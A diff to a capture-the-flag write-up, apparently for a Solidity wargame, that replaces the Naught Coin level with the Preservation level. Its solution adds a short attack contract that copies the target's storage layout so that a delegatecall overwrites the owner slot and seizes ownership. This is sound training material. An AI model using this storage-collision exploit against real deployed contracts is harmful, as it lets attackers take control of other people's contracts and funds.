@@ -1,11 +1,11 @@
-# Level 15 - Naught Coin
+# Level 16 - Preservation
 
 ### Objective
 
 The objective of this level is as follows:
 
-1. NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely?
-2. Complete this level by getting your token balance to 0.
+1. This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
+2. The goal of this level is for you to claim ownership of the instance you are given.
 
 ### Contract
 
@@ -55,7 +55,17 @@ contract LibraryContract {
 ### Solution
 
 ```
+pragma solidity ^0.6.5;
 
+contract attackPreservation {
+    address slot0;
+    address slot1;
+    address slot2;
+
+ function setTime(uint _time) public {
+    slot2 = msg.sender;
+  }
+}
 ```
 
 Done!
